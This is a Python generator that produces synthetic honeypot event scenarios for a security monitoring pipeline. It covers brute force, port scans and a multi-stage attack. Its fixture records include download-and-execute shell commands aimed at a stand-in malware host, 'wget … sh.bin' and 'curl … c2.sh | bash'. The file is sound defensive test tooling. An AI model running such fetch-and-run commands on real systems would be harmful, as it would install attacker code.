"""
Deterministic T-Pot Honeypot Scenario Generator.
Generates 7 canonical scenario pipelines (and 2 system states) that pass through
the exact same TPotParser normalization, correlation, IOC extraction, MITRE mapping,
and Knowledge Base pipeline as live events, tagged explicitly with source_mode = "SCENARIO".

Scenarios:
1. BENIGN_CONNECTION
2. SSH_BRUTE_FORCE
3. SUCCESSFUL_SSH_COMPROMISE
4. COMMAND_EXECUTION
5. MALWARE_PAYLOAD_DELIVERY
6. PORT_SCAN
7. MULTI_STAGE_ATTACK
8. NO_DATA_STATE
9. DISCONNECTED_STATE
"""

from datetime import datetime, timedelta
from typing import List, Dict, Any
from pathlib import Path
import json

from ingestion.parsers.tpot_parser import TPotParser
from ingestion.dataset_registry import DatasetMetadata, DatasetType, DatasetFormat

class TPotScenarioEngine:
    def __init__(self):
        meta = DatasetMetadata(
            dataset_id="tpot_scenario_01",
            name="tpot_scenario",
            dataset_type=DatasetType.HONEYPOT_LOGS,
            format=DatasetFormat.JSON,
            path=Path("datasets/tpotce-master"),
            parser_class="TPotParser",
            description="Deterministic T-Pot Scenario Generator",
            source="ATLAS Scenario Engine"
        )
        self.parser = TPotParser(meta)

    def generate_scenario(self, scenario_name: str) -> Dict[str, Any]:
        """Generates raw events, normalizes them via TPotParser, and returns scenario payload."""
        now = datetime.now()
        name = scenario_name.upper()

        if name == "DISCONNECTED":
            return {
                "connection": "DISCONNECTED",
                "telemetry": "ERROR",
                "sensor_heartbeat": None,
                "last_event": None,
                "event_count": 0,
                "events": [],
                "sessions": [],
                "source_mode": "SCENARIO"
            }
        elif name == "NO_DATA":
            return {
                "connection": "CONNECTED",
                "telemetry": "NO_DATA",
                "sensor_heartbeat": now.isoformat(),
                "last_event": None,
                "event_count": 0,
                "events": [],
                "sessions": [],
                "source_mode": "SCENARIO"
            }

        raw_records = []
        
        if name == "BENIGN" or name == "BENIGN_CONNECTION":
            raw_records = [
                {
                    "session": "evt-benign-101",
                    "@timestamp": now.isoformat(),
                    "type": "honeytrap",
                    "src_ip": "192.168.1.50",
                    "src_port": 51204,
                    "dest_port": 80,
                    "protocol": "tcp",
                    "payload": "GET / HTTP/1.1",
                    "status": "restored"
                }
            ]
        elif name == "SSH_BRUTE_FORCE" or name == "BRUTE_FORCE":
            raw_records = [
                {
                    "session": f"evt-bf-{i}",
                    "@timestamp": (now - timedelta(seconds=120 - i * 10)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 49150 + i,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": u,
                    "input": f"LOGIN FAILED (user: {u})",
                    "status": "pending_approval"
                }
                for i, u in enumerate(["admin", "root", "support", "user", "oracle", "test", "postgres"])
            ]
        elif name == "SUCCESSFUL_SSH_COMPROMISE" or name == "SSH_COMPROMISE":
            raw_records = [
                {
                    "session": "evt-comp-101",
                    "@timestamp": (now - timedelta(seconds=60)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 50120,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "root",
                    "input": "LOGIN SUCCESSFUL (user: root)",
                    "status": "pending_approval"
                },
                {
                    "session": "evt-comp-102",
                    "@timestamp": (now - timedelta(seconds=30)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 50120,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "root",
                    "input": "uname -a; id; whoami",
                    "status": "pending_approval"
                }
            ]
        elif name == "COMMAND_EXECUTION":
            raw_records = [
                {
                    "session": "evt-cmd-101",
                    "@timestamp": now.isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 50122,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "root",
                    "input": "wget http://malware-drop.org/sh.bin -O /tmp/sh.bin; chmod +x /tmp/sh.bin; /tmp/sh.bin",
                    "status": "pending_approval"
                }
            ]
        elif name == "MALWARE_PAYLOAD_DELIVERY" or name == "PAYLOAD_DELIVERY":
            raw_records = [
                {
                    "session": "evt-mal-101",
                    "@timestamp": now.isoformat(),
                    "type": "dionaea",
                    "src_ip": "45.120.21.32",
                    "src_port": 54102,
                    "dest_port": 445,
                    "protocol": "tcp",
                    "file_name": "lockbit_payload.exe",
                    "sha256_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    "status": "pending_approval"
                }
            ]
        elif name == "PORT_SCAN":
            raw_records = [
                {
                    "session": f"evt-scan-{port}",
                    "@timestamp": (now - timedelta(seconds=30 - idx * 2)).isoformat(),
                    "type": "honeytrap",
                    "src_ip": "198.51.100.42",
                    "src_port": 60100 + idx,
                    "dest_port": port,
                    "protocol": "tcp",
                    "payload": f"TCP SYN probe to port {port}",
                    "status": "pending_approval"
                }
                for idx, port in enumerate([21, 22, 80, 443, 445, 1433, 3389, 8080])
            ]
        elif name == "MULTI_STAGE_ATTACK" or name == "KILL_CHAIN":
            raw_records = [
                # Stage 1: Port probe
                {
                    "session": "evt-ms-101",
                    "@timestamp": (now - timedelta(minutes=10)).isoformat(),
                    "type": "honeytrap",
                    "src_ip": "185.220.101.4",
                    "src_port": 51000,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "payload": "TCP SYN Scan",
                    "status": "pending_approval"
                },
                # Stage 2: Brute force
                {
                    "session": "evt-ms-102",
                    "@timestamp": (now - timedelta(minutes=8)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 51001,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "admin",
                    "input": "LOGIN FAILED (user: admin)",
                    "status": "pending_approval"
                },
                # Stage 3: Auth success
                {
                    "session": "evt-ms-103",
                    "@timestamp": (now - timedelta(minutes=5)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 51002,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "root",
                    "input": "LOGIN SUCCESSFUL (user: root)",
                    "status": "pending_approval"
                },
                # Stage 4: Execution & Drop
                {
                    "session": "evt-ms-104",
                    "@timestamp": (now - timedelta(minutes=2)).isoformat(),
                    "type": "cowrie",
                    "src_ip": "185.220.101.4",
                    "src_port": 51003,
                    "dest_port": 22,
                    "protocol": "tcp",
                    "username": "root",
                    "input": "curl -s http://malware-drop.org/c2.sh | bash",
                    "status": "pending_approval"
                }
            ]

        # Process raw records through canonical TPotParser
        normalized_events = []
        for r in raw_records:
            ue = self.parser.normalize_to_schema(r)
            ev_dict = ue.to_dict() if hasattr(ue, 'to_dict') else ue.__dict__
            ev_dict["source_mode"] = "SCENARIO"
            ev_dict["honeypot"] = r.get("type", "cowrie").upper()
            ev_dict["src_ip"] = r.get("src_ip", "127.0.0.1")
            ev_dict["dst_port"] = r.get("dest_port", 22)
            ev_dict["payload"] = r.get("input", r.get("payload", r.get("file_name", "Connection Established")))
            ev_dict["severity"] = "CRITICAL" if r.get("dest_port") == 445 or "curl" in str(r) else ("HIGH" if r.get("dest_port") == 22 else "MEDIUM")
            ev_dict["status"] = r.get("status", "pending_approval")
            normalized_events.append(ev_dict)

        return {
            "connection": "CONNECTED",
            "telemetry": "HEALTHY",
            "sensor_heartbeat": now.isoformat(),
            "last_event": now.isoformat(),
            "event_count": len(normalized_events),
            "events": normalized_events,
            "source_mode": "SCENARIO"
        }
